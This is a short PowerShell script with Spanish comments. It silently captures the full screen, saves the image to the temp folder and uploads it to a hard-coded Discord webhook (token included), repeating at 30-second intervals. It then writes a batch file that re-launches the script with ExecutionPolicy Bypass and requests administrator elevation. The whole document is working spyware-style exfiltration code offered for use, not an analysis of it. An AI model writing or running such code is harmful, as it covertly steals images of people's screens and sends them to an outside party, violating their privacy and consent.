# Función para capturar y enviar la captura de pantalla al webhook
function CaptureAndSendScreenshot {
    # Definir la ruta del archivo temporal de la captura de pantalla
    $screenshotFile = "$env:TEMP\SC.png"

    # Capturar la pantalla y guardarla en el archivo temporal
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envío de la captura de pantalla al webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
}

# Definir la URL del webhook
$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

# Definir la cantidad de capturas de pantalla a enviar
$numberOfScreenshots = 2

# Definir el intervalo de tiempo entre capturas (en segundos)
$intervalSeconds = 30

# Realizar capturas de pantalla y enviarlas al webhook
for ($i = 1; $i -le $numberOfScreenshots; $i++) {
    CaptureAndSendScreenshot
    Start-Sleep -Seconds $intervalSeconds
}

# Obtener la ubicación del script actual
$scriptPath = $MyInvocation.MyCommand.Path

# Crear un archivo de comando por lotes (batch) para ejecutar el script como administrador
$batchScriptPath = "$env:TEMP\RunAsAdmin.bat"
$batchScriptContent = "@echo off`npowershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII

# Ejecutar el archivo de comando por lotes como administrador
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchScriptPath`"" -Verb RunAs
